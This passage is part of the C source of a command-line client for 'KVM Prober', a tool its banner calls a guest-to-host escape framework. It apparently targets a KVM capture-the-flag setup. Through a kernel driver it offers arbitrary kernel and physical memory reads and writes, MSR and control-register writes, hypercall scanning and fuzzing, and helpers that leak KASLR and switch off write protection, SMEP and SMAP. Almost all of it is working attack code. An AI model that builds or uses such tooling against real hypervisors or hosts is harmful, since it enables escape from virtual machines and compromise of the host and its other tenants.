    if (ioctl(fd, IOCTL_SPTE_TO_PFN, &req) < 0) {
        printf("[-] spte decode failed\n");
        return;
    }
    printf("[+] SPTE: 0x%lx\n", spte);
    printf("    PFN: 0x%lx, Present: %d, Writable: %d, Executable: %d\n",
           req.pfn, req.present, req.writable, req.executable);
}

void walk_ept(unsigned long eptp, unsigned long gpa) {
    struct ept_walk_request req = { .eptp = eptp, .gpa = gpa };
    if (ioctl(fd, IOCTL_WALK_EPT, &req) < 0) {
        printf("[-] EPT walk failed\n");
        return;
    }
    printf("[+] EPT Walk: GPA 0x%lx -> HPA 0x%lx\n", gpa, req.hpa);
    printf("    PML4E: 0x%lx, PDPTE: 0x%lx, PDE: 0x%lx, PTE: 0x%lx\n",
           req.pml4e, req.pdpte, req.pde, req.pte);
}

void translate_gva(unsigned long gva, unsigned long cr3) {
    struct gva_translate_request req = { .gva = gva, .cr3 = cr3 };
    if (ioctl(fd, IOCTL_TRANSLATE_GVA, &req) < 0 || req.status != 0) {
        printf("[-] GVA translation failed\n");
        return;
    }
    printf("[+] GVA: 0x%lx -> GPA: 0x%lx\n", gva, req.gpa);
}

void show_addr_info(unsigned long addr) {
    printf("[+] Address Analysis: 0x%016lx\n", addr);
    printf("    Page offset: 0x%lx\n", addr & 0xFFF);
    printf("    Rough PFN: 0x%lx\n", addr >> 12);
    
    struct virt_to_phys_request vp = { .virt_addr = addr };
    if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &vp) >= 0 && vp.status == 0) {
        printf("    -> Physical: 0x%lx (PFN: 0x%lx)\n", vp.phys_addr, vp.pfn);
    }
}

/* ========================================================================
 * Help and Main
 * ======================================================================== */

void print_help(void) {
    printf("╔══════════════════════════════════════════════════════════════════════════╗\n");
    printf("║          KVM Prober - Guest-to-Host Escape Framework v2.1                ║\n");
    printf("║                    With CTF Hypercall Support                            ║\n");
    printf("╚══════════════════════════════════════════════════════════════════════════╝\n\n");
    
    printf("HYPERCALL OPERATIONS:\n");
    printf("  hypercall <nr> [a0] [a1] [a2] [a3] - Execute single hypercall\n");
    printf("  hc_batch                           - Run CTF hypercalls 100-103\n");
    printf("  hc_scan <start> <end>              - Scan range of hypercalls\n");
    printf("  hc_test                            - Test CTF hypercalls\n\n");
    
    printf("KVM CTF HYPERCALLS:\n");
    printf("  100 - Read flag (after write to write_flag addr)\n");
    printf("  101 - Relative memory write (KASAN)\n");
    printf("  102 - Relative memory read (KASAN)\n");
    printf("  103 - DoS (null-ptr-deref) - DANGEROUS!\n\n");
    
    printf("SYMBOL OPERATIONS:\n");
    printf("  lookup <symbol>              - Lookup specific symbol\n");
    printf("  count                        - Show symbol count\n");
    printf("  list [max]                   - List symbols\n");
    printf("  search <pattern>             - Search by pattern\n");
    printf("  find <substring>             - Find containing substring\n");
    printf("  vmx / svm                    - Show handler info\n\n");
    
    printf("MEMORY READ OPERATIONS:\n");
    printf("  read_kernel <addr> <size>    - Read kernel virtual memory\n");
    printf("  read_phys <addr> <size>      - Read physical memory\n");
    printf("  read_guest <gpa> <size> <mode> - Read guest (0=GPA,1=GVA,2=GFN)\n");
    printf("  scan <start> <end> <step> <type> <pattern>\n");
    printf("  pattern <start> <end> <hex>  - Find pattern\n\n");
    
    printf("MEMORY WRITE OPERATIONS:\n");
    printf("  write_kernel <addr> <hex>    - Write hex to kernel memory\n");
    printf("  write_kernel_wp <addr> <hex> - Write with WP bypass\n");
    printf("  write_phys <addr> <hex>      - Write hex to physical memory\n");
    printf("  write_guest <gpa> <hex> <mode>\n");
    printf("  memset_kernel/memset_phys <addr> <val> <size>\n");
    printf("  patch <addr> <orig> <new> <type>\n\n");
    
    printf("ADDRESS CONVERSION:\n");
    printf("  v2p <virt>         p2v <phys> [ioremap]\n");
    printf("  hva2pfn <hva>      pfn2hva <pfn>\n");
    printf("  gpa2gfn <gpa>      gfn2gpa <gfn>\n");
    printf("  gpa2hva <gpa>      spte <value>\n");
    printf("  ept_walk <eptp> <gpa>   gva2gpa <gva> <cr3>\n");
    printf("  addrinfo <addr>\n\n");
    
    printf("REGISTER OPERATIONS:\n");
    printf("  cr <num>                 msr <num>\n");
    printf("  write_msr <msr> <val>    write_cr <num> <val> [mask]\n");
    printf("  pgtable <virt_addr>\n\n");
    
    printf("EXPLOITATION:\n");
    printf("  kaslr                    critical\n");
    printf("  disable_wp / disable_smep / disable_smap / disable_security\n\n");
    
    printf("NOTE: After every read/write/scan, hypercalls 100-103 run automatically\n");
    printf("      and report any interesting (non-zero/non-0xff...) results.\n\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) { print_help(); return 1; }
    
    char *cmd = argv[1];
    if (strcmp(cmd, "help") == 0) { print_help(); return 0; }
    if (init_driver() < 0) return 1;
    
    /* Hypercall operations */
    if (strcmp(cmd, "hypercall") == 0 && argc > 2) {
        unsigned long nr = strtoul(argv[2], NULL, 0);
        unsigned long a0 = (argc > 3) ? strtoul(argv[3], NULL, 0) : 0;
        unsigned long a1 = (argc > 4) ? strtoul(argv[4], NULL, 0) : 0;
        unsigned long a2 = (argc > 5) ? strtoul(argv[5], NULL, 0) : 0;
        unsigned long a3 = (argc > 6) ? strtoul(argv[6], NULL, 0) : 0;
        do_hypercall(nr, a0, a1, a2, a3);
    }
    else if (strcmp(cmd, "hc_batch") == 0) hypercall_batch();
    else if (strcmp(cmd, "hc_scan") == 0 && argc > 3)
        hypercall_scan(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0));
    else if (strcmp(cmd, "hc_test") == 0) test_ctf_hypercalls();
    
    /* Symbol operations */
    else if (strcmp(cmd, "lookup") == 0 && argc > 2) lookup_symbol(argv[2]);
    else if (strcmp(cmd, "count") == 0) get_symbol_count();
    else if (strcmp(cmd, "list") == 0) list_symbols(argc > 2 ? atoi(argv[2]) : 0);
    else if (strcmp(cmd, "search") == 0 && argc > 2) search_symbols(argv[2]);
    else if (strcmp(cmd, "find") == 0 && argc > 2) find_symbol_by_name(argv[2]);
    else if (strcmp(cmd, "vmx") == 0) analyze_vmx_handlers();
    else if (strcmp(cmd, "svm") == 0) analyze_svm_handlers();
    
    /* Memory read operations */
    else if (strcmp(cmd, "read_kernel") == 0 && argc > 3) 
        read_kernel_mem(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0));
    else if (strcmp(cmd, "read_phys") == 0 && argc > 3)
        read_physical_mem(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0));
    else if (strcmp(cmd, "read_guest") == 0 && argc > 4)
        read_guest_mem(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0), atoi(argv[4]));
    else if (strcmp(cmd, "scan") == 0 && argc > 6)
        scan_memory(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0),
                   strtoul(argv[4], NULL, 0), atoi(argv[5]), argv[6]);
    else if (strcmp(cmd, "pattern") == 0 && argc > 4)
        find_pattern(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0), argv[4]);
    
    /* Memory write operations */
    else if (strcmp(cmd, "write_kernel") == 0 && argc > 3)
        write_kernel_mem_hex(strtoul(argv[2], NULL, 0), argv[3], 0);
    else if (strcmp(cmd, "write_kernel_wp") == 0 && argc > 3)
        write_kernel_mem_hex(strtoul(argv[2], NULL, 0), argv[3], 1);
    else if (strcmp(cmd, "write_phys") == 0 && argc > 3)
        write_physical_mem_hex(strtoul(argv[2], NULL, 0), argv[3]);
    else if (strcmp(cmd, "write_guest") == 0 && argc > 4)
        write_guest_mem_hex(strtoul(argv[2], NULL, 0), argv[3], atoi(argv[4]));
    else if (strcmp(cmd, "memset_kernel") == 0 && argc > 4)
        memset_kernel(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0), 
                      strtoul(argv[4], NULL, 0));
    else if (strcmp(cmd, "memset_phys") == 0 && argc > 4)
        memset_physical(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0),
                        strtoul(argv[4], NULL, 0));
    else if (strcmp(cmd, "patch") == 0 && argc > 5)
        patch_bytes(strtoul(argv[2], NULL, 0), argv[3], argv[4], 1, atoi(argv[5]));

    /* Address conversion operations */
    else if (strcmp(cmd, "v2p") == 0 && argc > 2)
        convert_virt_to_phys(strtoul(argv[2], NULL, 0));
    else if (strcmp(cmd, "p2v") == 0 && argc > 2)
        convert_phys_to_virt(strtoul(argv[2], NULL, 0), argc > 3 ? atoi(argv[3]) : 0);
    else if (strcmp(cmd, "hva2pfn") == 0 && argc > 2)
        convert_hva_to_pfn(strtoul(argv[2], NULL, 0));
    else if (strcmp(cmd, "pfn2hva") == 0 && argc > 2)
        convert_pfn_to_hva(strtoul(argv[2], NULL, 0));
    else if (strcmp(cmd, "gpa2gfn") == 0 && argc > 2)
        convert_gpa_to_gfn(strtoul(argv[2], NULL, 0));
    else if (strcmp(cmd, "gfn2gpa") == 0 && argc > 2)
        convert_gfn_to_gpa(strtoul(argv[2], NULL, 0));
    else if (strcmp(cmd, "gpa2hva") == 0 && argc > 2)
        convert_gpa_to_hva(strtoul(argv[2], NULL, 0));
    else if (strcmp(cmd, "spte") == 0 && argc > 2)
        decode_spte(strtoul(argv[2], NULL, 0));
    else if (strcmp(cmd, "ept_walk") == 0 && argc > 3)
        walk_ept(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0));
    else if (strcmp(cmd, "gva2gpa") == 0 && argc > 3)
        translate_gva(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0));
    else if (strcmp(cmd, "addrinfo") == 0 && argc > 2)
        show_addr_info(strtoul(argv[2], NULL, 0));
    
    /* Register operations */
    else if (strcmp(cmd, "cr") == 0 && argc > 2) read_cr_register(atoi(argv[2]));
    else if (strcmp(cmd, "msr") == 0 && argc > 2) read_msr_register(strtoul(argv[2], NULL, 0));
    else if (strcmp(cmd, "write_msr") == 0 && argc > 3)
        write_msr(strtoul(argv[2], NULL, 0), strtoull(argv[3], NULL, 0));
    else if (strcmp(cmd, "write_cr") == 0 && argc > 3)
        write_cr(atoi(argv[2]), strtoul(argv[3], NULL, 0), 
                 argc > 4 ? strtoul(argv[4], NULL, 0) : 0);
    else if (strcmp(cmd, "pgtable") == 0 && argc > 2) 
        dump_page_tables(strtoul(argv[2], NULL, 0));
    
    /* Exploitation helpers */
    else if (strcmp(cmd, "kaslr") == 0) get_kaslr_info();
    else if (strcmp(cmd, "critical") == 0) dump_critical_regions();
    else if (strcmp(cmd, "disable_wp") == 0) disable_write_protect();
    else if (strcmp(cmd, "disable_smep") == 0) disable_smep();
    else if (strcmp(cmd, "disable_smap") == 0) disable_smap();
    else if (strcmp(cmd, "disable_security") == 0) disable_security();
    
    else { printf("[-] Unknown command: %s\n", cmd); print_help(); }
    
    close(fd);
    return 0;
}